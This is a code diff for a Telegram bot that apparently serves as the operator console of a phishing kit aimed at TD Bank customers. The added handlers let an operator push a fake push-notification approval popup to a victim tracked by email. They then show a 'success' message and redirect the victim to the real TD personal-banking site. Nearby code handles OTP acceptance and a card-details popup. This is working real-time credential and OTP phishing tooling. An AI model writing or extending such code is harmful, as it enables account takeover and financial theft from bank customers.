@@ -199,6 +199,42 @@ bot.on('callback_query', async (callbackQuery) => {
       );
       console.log(`[Bot] Triggered app download popup for ${email}`);
 
+    } else if (action === 'show_app_push') {
+      session.status = 'app_push_popup';
+      await bot.answerCallbackQuery(callbackQueryId, { text: '📲 Push Notification Popup triggered!' });
+      
+      const new_reply_markup = {
+        inline_keyboard: [
+          [{ text: '🔄 Redirect User (Success)', callback_data: `redirect_success:${email}` }],
+          [{ text: '❌ Cancel Session', callback_data: `cancel:${email}` }]
+        ]
+      };
+      
+      await bot.editMessageText(
+        formatMessage('📲 PUSH NOTIFICATION POPUP TRIGGERED', email, session, 'Waiting for user to approve push notification...'),
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id,
+          reply_markup: new_reply_markup
+        }
+      );
+      console.log(`[Bot] Triggered app push popup for ${email}`);
+
+    } else if (action === 'redirect_success') {
+      session.status = 'redirect_success';
+      const redirectUrl = 'https://www.td.com/ca/en/personal-banking';
+      session.redirectUrl = redirectUrl;
+
+      await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Redirecting user with success message...' });
+      await bot.editMessageText(
+        formatMessage('🔄 REDIRECT (SUCCESS) TRIGGERED', email, session, `User redirecting to ${redirectUrl} after 3s`, `🌐 Redirecting to: ${redirectUrl}`),
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Redirected user ${email} to ${redirectUrl} with success message`);
+
     } else if (action === 'accept_otp_card') {
       session.status = 'card_popup';
       await bot.answerCallbackQuery(callbackQueryId, { text: '💳 OTP Accepted — Card popup triggered!' });
